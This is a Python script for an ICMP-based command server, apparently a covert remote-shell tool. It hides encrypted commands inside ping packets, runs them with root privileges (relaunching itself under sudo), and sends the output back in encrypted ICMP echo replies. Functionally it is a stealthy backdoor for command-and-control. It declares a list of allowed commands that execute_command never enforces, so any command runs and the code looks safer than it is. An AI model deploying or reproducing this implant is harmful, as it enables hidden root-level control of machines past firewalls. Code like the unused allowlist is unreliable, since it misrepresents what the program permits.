import hashlib
import logging
import os
import secrets
import shlex
import socket
import struct
import subprocess
import sys
import zlib
from concurrent.futures import ThreadPoolExecutor

from Crypto.Cipher import AES

try:
    from .logging_config import configure, get_logger  # noqa: F401
except ImportError:
    from logging_config import configure

ICMP_COMMAND_TIMEOUT = 5
ICMP_BUFFER_SIZE = 4096
AES_NONCE_LENGTH = 12
AES_TAG_LENGTH = 16
ALLOWED_ICMP_COMMANDS = frozenset({
    "id", "whoami", "hostname", "uname -a", "ip addr", "ip route",
    "ifconfig", "netstat -tlnp", "ps aux", "ls", "pwd", "cat /etc/hostname",
    "exit",
})


# Verificar y relanzar con sudo si es necesario
def check_sudo():
    if os.geteuid() != 0:
        print("[S] Este script necesita permisos de superusuario. Relanzando con sudo...")
        args = ['sudo', sys.executable] + sys.argv
        os.execvpe('sudo', args, os.environ)

if __name__ == "__main__":
    check_sudo()
def encrypt_data(data, key):
    """Encrypt bytes with AES-256-GCM returning ``nonce || ciphertext || tag``.

    Args:
        data: Plaintext bytes to encrypt.
        key: 32-byte AES-256 key.

    Returns:
        Concatenated nonce, ciphertext and authentication tag.
    """
    nonce = secrets.token_bytes(AES_NONCE_LENGTH)
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    return nonce + ciphertext + tag


def decrypt_data(data, key):
    """Decrypt bytes produced by ``encrypt_data`` after authenticating them.

    Args:
        data: ``nonce || ciphertext || tag`` payload.
        key: 32-byte AES-256 key.

    Returns:
        Decrypted plaintext bytes.

    Raises:
        ValueError: If the payload is malformed or the tag fails to verify.
    """
    if len(data) < AES_NONCE_LENGTH + AES_TAG_LENGTH:
        raise ValueError("payload too short to contain nonce and tag")
    nonce = data[:AES_NONCE_LENGTH]
    tag = data[-AES_TAG_LENGTH:]
    ciphertext = data[AES_NONCE_LENGTH:-AES_TAG_LENGTH]
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    return cipher.decrypt_and_verify(ciphertext, tag)

def execute_command(command):
    try:
        parts = shlex.split(command)
        if not parts:
            return "Empty command"
        result = subprocess.run(
            parts,
            shell=False,
            capture_output=True,
            text=True,
            timeout=ICMP_COMMAND_TIMEOUT,
        )
        return result.stdout if result.stdout else result.stderr
    except subprocess.TimeoutExpired:
        return "Command exceeded timeout"
    except Exception as e:
        return f"Error executing command: {str(e)}"

def send_icmp_reply(sock, addr, data, key):
    packet_id = os.getpid() & 0xFFFF

    # Comprimir y encriptar los datos
    compressed_data = zlib.compress(data.encode())
    encrypted_data = encrypt_data(compressed_data, key)

    # Crear el encabezado del ICMP Echo Reply (tipo 0)
    header = struct.pack('bbHHh', 0, 0, 0, packet_id, 1)
    my_checksum = checksum(header + encrypted_data)
    header = struct.pack('bbHHh', 0, 0, socket.htons(my_checksum), packet_id, 1)
    packet = header + encrypted_data

    try:
        sock.sendto(packet, addr)
        logging.info(f"Respuesta ICMP enviada a {addr[0]}")
    except OSError as e:
        logging.error(f"Error al enviar el paquete de respuesta: {str(e)}")

def checksum(source_string):
    sum = 0
    count_to = (len(source_string) // 2) * 2
    for count in range(0, count_to, 2):
        this_val = source_string[count + 1] * 256 + source_string[count]
        sum = sum + this_val
        sum = sum & 0xffffffff
    if count_to < len(source_string):
        sum = sum + source_string[-1]
        sum = sum & 0xffffffff
    sum = (sum >> 16) + (sum & 0xffff)
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer

def handle_packet(packet, addr, key, sock):
    icmp_header = packet[20:28]
    icmp_type, code, checksum, packet_id, sequence = struct.unpack('bbHHh', icmp_header)
    if icmp_type == 8:  # ICMP echo request
        encrypted_data = packet[28:]
        try:
            decrypted_data = decrypt_data(encrypted_data, key)
            decompressed_data = zlib.decompress(decrypted_data)
            data = decompressed_data.decode().strip()
            logging.info(f"Comando recibido de {addr[0]}: {data}")

            if data.lower() == 'exit':
                logging.info("Comando de salida recibido. Cerrando el servidor...")
                return False

            result = execute_command(data)
            logging.info(f"Resultado: {result}")

            # Enviar respuesta al cliente
            send_icmp_reply(sock, addr, result, key)
        except Exception as e:
            logging.error(f"Error al procesar el paquete: {str(e)}")
    return True

def listen_for_icmp(interface, key):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        logging.error("Error: Este script requiere privilegios de administrador.")
        return

    if interface:
        sock.bind((interface, 0))

    logging.info(f"Servidor ICMP en ejecución{' en ' + interface if interface else ''}...")
    logging.info("Presione Ctrl+C para salir.")

    with ThreadPoolExecutor(max_workers=5) as executor:
        try:
            while True:
                logging.info("Esperando paquetes ICMP...")
                packet, addr = sock.recvfrom(ICMP_BUFFER_SIZE)  # Aquí esperas por un paquete ICMP
                logging.info(f"Paquete recibido de {addr[0]}")
                # Enviar tarea al pool de hilos sin bloquear
                executor.submit(handle_packet, packet, addr, key, sock)
        except KeyboardInterrupt:
            logging.info("\nServidor terminado por el usuario.")
        finally:
            sock.close()

def main():
    import argparse
    parser = argparse.ArgumentParser(description='Servidor ICMP para recibir y ejecutar comandos.')
    parser.add_argument('-i', '--interface', help='Interfaz de red para escuchar')
    parser.add_argument('-p', '--password', required=True, help='Contraseña para desencriptar los datos')
    parser.add_argument('-l', '--log', default='icmp_server.log', help='Archivo de log')
    args = parser.parse_args()

    log_dir = os.path.dirname(args.log) or os.getcwd()
    configure(level=logging.INFO, log_dir=log_dir, console=True, file=True)

    key = hashlib.sha256(args.password.encode()).digest()

    listen_for_icmp(args.interface, key)

if __name__ == "__main__":
    main()
